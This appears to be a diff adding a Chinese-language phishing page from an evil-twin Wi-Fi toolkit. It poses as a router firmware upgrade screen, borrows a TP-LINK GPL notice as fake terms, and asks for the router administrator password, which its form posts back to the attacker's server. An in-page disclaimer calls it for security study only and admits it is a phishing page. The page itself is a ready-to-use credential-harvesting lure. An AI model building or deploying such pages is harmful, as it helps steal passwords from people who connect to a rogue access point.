@@ -1,0 +1,169 @@
+<html lang="en">
+<head>
+<title>路由器固件升级</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style type="text/css">
+.form-control[disabled], .form-control[readonly], fieldset[disabled] .form-control {
+	background-color: #eee;
+	opacity: 1
+}
+.btn-primary {
+	color: #fff;
+	background-color: #337ab7;
+	border-color: #2e6da4
+}
+.btn {
+	display: inline-block;
+	padding: 6px 12px;
+	margin-bottom: 0;
+	font-size: 14px;
+	font-weight: 400;
+	line-height: 1.42857143;
+	text-align: center;
+	white-space: nowrap;
+	vertical-align: middle;
+	-ms-touch-action: manipulation;
+	touch-action: manipulation;
+	cursor: pointer;
+	-webkit-user-select: none;
+	-moz-user-select: none;
+	-ms-user-select: none;
+	user-select: none;
+	background-image: none;
+	border: 1px solid transparent;
+	border-radius: 4px
+}
+.textarea.form-control {
+	height: auto
+}
+.form-control {
+	display: block;
+	width: 100%;
+	padding: 6px 12px;
+	font-size: 14px;
+	line-height: 1.42857143;
+	color: #555;
+	background-color: #fff;
+	background-image: none;
+	border: 1px solid #ccc;
+	border-radius: 4px;
+	box-shadow: inset 0 1px 1px rgba(0,0,0,.075);
+	-o-transition: border-color ease-in-out .15s, box-shadow ease-in-out .15s;
+	transition: border-color ease-in-out .15s, box-shadow ease-in-out .15s
+}
+.container {
+	width: 580px;
+	margin: 0 auto
+}
+.textarea {
+	overflow: auto
+}
+.text-center {
+	text-align: center
+}
+html, body {
+	
+	height: 100%
+}
+#wrap {
+	min-height: 100%;
+	height: auto!important;
+	height: 100%;
+	margin: 0 auto -60px
+}
+}
+</style>
+</head>
+
+<body >
+<div class="container">
+  <div>
+    <h2 class="text-center" style="color: royalblue;">路由器固件升级</h2>
+    <p class="lead">----------------- 🌞使用说明 🖼 --------------</p>
+    <p class="lead">本软件仅用作网络安防学习，请在得到网路管理员许可后自行测试。不得用于犯罪用途。请自行承担违法责任，本github源码发布者（bingcheng1998.github.io）不承担任何责任。如果你是不小心点入这个界面，请马上退出，因为这是一个钓鱼wifi。</p>
+    <p class="lead">----------------------------------------------------</p>
+    <p class="lead">已检测到新版本的固件，并等待安装。 请查看我们的新条款和条件并继续。</p>
+  </div>
+  <form id="formid" method="POST">
+    <div>
+      <label for="comment">条款和条件:</label>
+      <textarea class="form-control" id="comment" rows="5" readonly>GNU通用公共许可证通知
+本产品包括由第三方开发的软件代码，
+包括遵循GNU通用公共许可证的软件代码
+（“GPL”）。适用时，TP-LINK提供机器的邮件服务
+CD-ROM上相应的GPL源代码的可读拷贝
+根据要求通过电子邮件或传统纸质邮件。 TP-LINK将会
+收取名义费用以支付航运和媒体费用
+允许在GPL下。此优惠至少有效期为3年。
+有关GPL查询和GPL光盘信息，请联系
+我们在GPL@tp-link.com或
+24楼（1,3,4,5层）和28层（楼4-4层）中央科学与
+深圳市南山区深南路科技园。
+此外，TP-LINK提供了一个GPL代码中心，位于http：//
+www.tp-link.com/en/support/gpl/机器可读副本
+的TPL产品中使用的GPL源代码可用
+免费下载。请注意，GPL代码中心仅提供
+作为对TP-LINK的客户的礼貌，但可能不提供
+所有产品中使用的全套源代码，也不总是提供
+这些源代码的最新或实际版本。
+本产品中使用的GPL代码不分配
+保证并受一个或多个作者的版权保护。
+请参考以下GNU通用公共许可证
+信息。
+GNU GENERAL PUBLIC LICENSE版本1，1989年2月
+ 版权所有（C）1989免费软件基金会
+
+       </textarea>
+      <div class="checkbox">
+        <label> <br>
+          <input id="check-box"  type="checkbox" onClick="checkBoxStatus()">
+          我同意上述条款和条件</label>
+      </div>
+    </div>
+    <div class="form-group has-feedback"> <br>
+      <label for="password">管理员密码:</label>
+      <input name="pass" class="form-control" id="pwd" type="password">
+    </div>
+    <div class="container text-center"> <br>
+      <input class="btn btn-primary" id="btn" type="button" value="开始升级" onClick="checkBoxStatus(),getPass()">
+    </div>
+  </form>
+  <div id="push"></div>
+</div>
+<script>
+
+function checkBoxStatus()
+{
+	var box = document.getElementById("check-box");
+	var input = document.getElementById("pwd");
+	if ( box.checked == true )
+		{
+			input.disabled = false;
+			return false;
+		}
+	else
+		{
+			input.disabled = true;
+			alert("请同意条款!");
+			return false;
+		}
+		
+}
+function getPass()
+{
+		var input = document.getElementById("pwd");
+
+	if(input.value=="")
+		{
+			alert("密码输入有误!");
+			return false;
+		}
+	else
+		{
+			document.getElementById("formid").submit();
+		}
+	}
+</script>
+</body>
+</html>
